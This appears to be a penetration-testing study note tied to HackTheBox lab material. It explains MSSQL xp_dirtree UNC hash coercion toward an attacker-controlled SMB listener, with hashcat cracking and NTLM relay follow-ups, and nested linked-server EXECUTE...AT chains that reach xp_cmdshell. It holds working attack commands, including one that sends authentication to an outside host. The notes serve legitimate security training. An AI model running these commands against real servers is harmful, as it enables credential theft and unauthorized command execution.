## MSSQL `xp_dirtree` UNC hash coercion: why a stored procedure causes outbound SMB auth

**Full command:**
```sql
EXECUTE master..xp_dirtree '\\192.168.45.200\share', 1, 1;
```
Listener on Kali:
```bash
sudo impacket-smbserver -smb2support share /tmp/share
```

**Piece by piece:**
- `xp_dirtree` → an extended stored procedure that reads a directory tree and returns file/folder names. Extended procs run as native code inside MSSQL's process space, so they can do anything the MSSQL service account can do — including making outbound network connections.
- `'\\192.168.45.200\share'` → a UNC path pointing at the attacker's machine. When MSSQL resolves a UNC path, it initiates an **SMB connection** to the specified host to enumerate the share.
- **Windows NTLM authentication is automatic.** The OS sends the MSSQL service account's Net-NTLMv2 hash as part of the SMB handshake, without prompting anyone. The attacker's SMB server (impacket-smbserver) is configured to capture and log that hash.
- `, 1, 1` → depth=1 (recurse 1 level), include files=1. The exact values don't matter for the hash capture — the connection and auth happen before the directory listing even starts.

**Why this works even when xp_cmdshell is disabled:**
`xp_cmdshell` requires the `xp_cmdshell` advanced option to be enabled. `xp_dirtree` is a different extended proc with no such gate — it's enabled in most default MSSQL configurations. The two procs are independently controlled.

**What to do with the captured hash:**
The output is a Net-NTLMv2 hash (same format as Responder captures). Crack offline: `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`. If cracking fails, try relay (impacket-ntlmrelayx targeting another host the service account has admin on).

**Where this comes from:** The `xp_dirtree` UNC coercion technique is well-documented in HackTricks and PayloadsAllTheThings. The underlying mechanism is Windows' automatic NTLM auth for any UNC path — same root cause as Responder LLMNR poisoning, just triggered via a database proc instead of a broadcast.

🔁 [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL — xp_dirtree UNC Hash Coercion|CS.6]]

---

## MSSQL linked server `EXECUTE...AT`: nested `''` quote escaping

**Full command:**
```sql
EXECUTE ('SELECT SYSTEM_USER') AT [LINKED_SRV];

-- Nested: run a command ON the linked server that itself runs a command on a second server
EXECUTE ('EXECUTE (''SELECT SYSTEM_USER'') AT [INNER_SRV]') AT [OUTER_SRV];

-- Three levels deep: run xp_cmdshell via two hops
EXECUTE ('EXECUTE (''EXECUTE (''''xp_cmdshell ''''''''whoami'''''''''''') AT [INNER]'') AT [OUTER]') AT [LOCAL_LINKED];
```

**Piece by piece:**
- `EXECUTE ('...') AT [server]` → sends the quoted string as a T-SQL statement to the linked server. The linked server receives the string and executes it as a local query.
- **The `''` doubling rule:** Inside a SQL string literal, a single quote is escaped by doubling it. So `'it''s'` represents the string `it's`. When you're nesting EXECUTE...AT blocks, each level of nesting adds another layer of string escaping.

**How the nesting stacks:**
- **Level 1 (local):** sends the literal string `SELECT SYSTEM_USER` to OUTER_SRV.
- **Level 2 (outer server runs):** outer server sees `EXECUTE ('SELECT SYSTEM_USER') AT [INNER_SRV]` — but since this is inside a level-1 string, the inner single quotes were doubled: `''SELECT SYSTEM_USER''`.
- **Level 3:** adds another layer — each `'` inside the level-2 string becomes `''''` in the level-1 source.

**Practical shortcut:** When building a three-hop chain, count how many string levels deep the quote sits and add that many extra `'` pairs. One level deep = `''`. Two levels deep = `''''`. Three levels = `''''''`.

**Where this comes from:** MSSQL T-SQL documentation on string literal escaping and the `EXECUTE...AT` distributed query syntax.

🔁 [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL — Linked Server Execution|CS.9]]

## **Outstanding**
- [x] UNION-based extraction, `INTO OUTFILE` webshell drop, `xp_cmdshell` (MSSQL), sqlmap `--technique`/`--os-shell` internals, done 2026-08-04.
- [x] PostgreSQL `CAST()` error-based extraction, stacked-query RCE via `COPY FROM PROGRAM`, done 2026-08-04.
- [x] xp_dirtree UNC hash coercion, EXECUTE...AT nested quoting, done 2026-08-17.
- [ ] Boolean-blind vs time-blind logic (the `IF(1=1, sleep(3), 'false')` construct), still outstanding.
